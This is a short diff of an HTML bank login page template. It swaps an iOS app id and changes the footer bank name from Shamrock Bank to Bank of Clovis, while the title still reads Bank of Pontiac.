@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head><meta charset="us-ascii"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="apple-itunes-app" content="app-id=1333264195">
+	<meta name="apple-itunes-app" content="app-id=1554112950">
 	<title>Bank of Pontiac Login</title>
 	<link href="https://cdn.jsdelivr.net/npm/daisyui@2.51.5/dist/full.css" rel="stylesheet" />
 	<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;display=swap" rel="stylesheet" />
@@ -164,7 +164,7 @@
 </div>
 
 <div class="footer">
-<div class="footer-content">&copy; 2024 Shamrock Bank</div>
+<div class="footer-content">&copy; 2024 Bank of Clovis</div>
 
 <div class="footer-content"><a href="#"><span style="color:#2980b9;">Privacy policy&nbsp;</span><span style="color: hsla(var(--bc)/var(--tw-text-opacity,1));">.&nbsp;&nbsp;Member FDIC</span></a></div>
 
